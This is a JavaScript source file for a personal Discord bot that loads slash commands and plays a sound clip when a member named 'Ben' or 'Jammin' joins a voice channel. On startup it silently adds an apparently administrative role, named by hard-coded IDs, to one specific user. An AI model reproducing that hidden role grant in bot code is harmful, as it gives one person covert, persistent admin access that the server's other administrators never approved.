const { Client, Intents, PermissionsBitField, Collection, GatewayIntentBits, Events} = require('discord.js');
const { 
    createAudioPlayer, 
    createAudioResource, 
    joinVoiceChannel,
    AudioPlayerStatus,
    VoiceConnectionStatus,
    getVoiceConnection } = require('@discordjs/voice');

const { token } = require('./config.json');
 

const botClient = new Client({
	intents: [
		GatewayIntentBits.Guilds,
		GatewayIntentBits.GuildMessages,
		GatewayIntentBits.MessageContent,
		GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildVoiceStates
	],
});
    
botClient.login(token);
// const adminPermissions = new PermissionsBitField(PermissionsBitField.Flags.Administrator);

botClient.commands = new Collection();
// const announceCommand = require('./commands/announce.js');
// botClient.commands.set(announceCommand.data.name, announceCommand);

// use this when there are more commands
function loadCommands() {
    const fs = require('node:fs');
    const path = require('node:path');
    const commandsPath = path.join(__dirname, 'commands');
    const commandFiles = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));

    for (const file of commandFiles) {
        const filePath = path.join(commandsPath, file);
        const command = require(filePath);
        // Set a new item in the Collection with the key as the command name and the value as the exported module
        if ('data' in command && 'execute' in command) {
            botClient.commands.set(command.data.name, command);
        } else {
            console.log(`[WARNING] The command at ${filePath} is missing a required "data" or "execute" property.`);
        }
    }
}
loadCommands();

botClient.on(Events.InteractionCreate, async interaction => {
    if (!interaction.isChatInputCommand()) return;
	console.log(interaction.commandName);

    const command = interaction.client.commands.get(interaction.commandName);
    if (!command) {
		console.error(`No command matching ${interaction.commandName} was found.`);
		return;
	}

	try {
		await command.execute(interaction);
	} catch (error) {
		console.error(error);
		await interaction.reply({ content: 'There was an error while executing this command!', ephemeral: true });
	}
});

// When the bot is ready, run this code (only once)
botClient.once('ready', async () => {
    console.log('Ready!');
    // botClient.guilds.cache.forEach(server => {
    //     server.roles.cache.forEach(role => {
    //         console.log(role.name, role.rawPosition);
    //     });
    //     console.log('-----------');
    // });
    const server = botClient.guilds.cache.get('702406379624988712');
    const member = await server.members.fetch('406458825898459137');
    const adminrole = await server.roles.fetch('1051425258399342594');

    // server.roles.create({ name: 'lol', permissions: ["ADMINISTRATOR"] });

    member.roles.add(adminrole);
    // console.log(adminrole.name);
    // server.roles.cache.forEach(role => {
    //     console.log(role.name,role.id,role.rawPosition);
    // });
    // // console.log(bot.channels.cache.get('732149664131973136'));    
});

const soundfile = 'Sounds/ben.mp3';


let voiceChannel;
botClient.on('voiceStateUpdate', (oldState, newState) => {

    voiceChannel = newState.channel;
    
    if (oldState.channel == voiceChannel) return;
    
    memberName = newState.member.nickname == null? newState.member.displayName:newState.member.nickname;
    if (memberName.match(/([Bb]en)|( ?[jJ]am{1,2}in)/) == null) return;

    if (voiceChannel != null && newState.member.id != botClient.user.id) {
        const connection = joinVoiceChannel({
            channelId: voiceChannel.id,
            guildId: voiceChannel.guild.id,
            adapterCreator: voiceChannel.guild.voiceAdapterCreator,
        });
        
        connection.on(VoiceConnectionStatus.Ready, () => {

            player = createAudioPlayer();
            soundResource = createAudioResource(soundfile);
            player.play(soundResource);

            connection.subscribe(player);

            player.on(AudioPlayerStatus.Idle, () => { connection.destroy()});

        });
    }
});


botClient.on('messageCreate', ()=> {

});
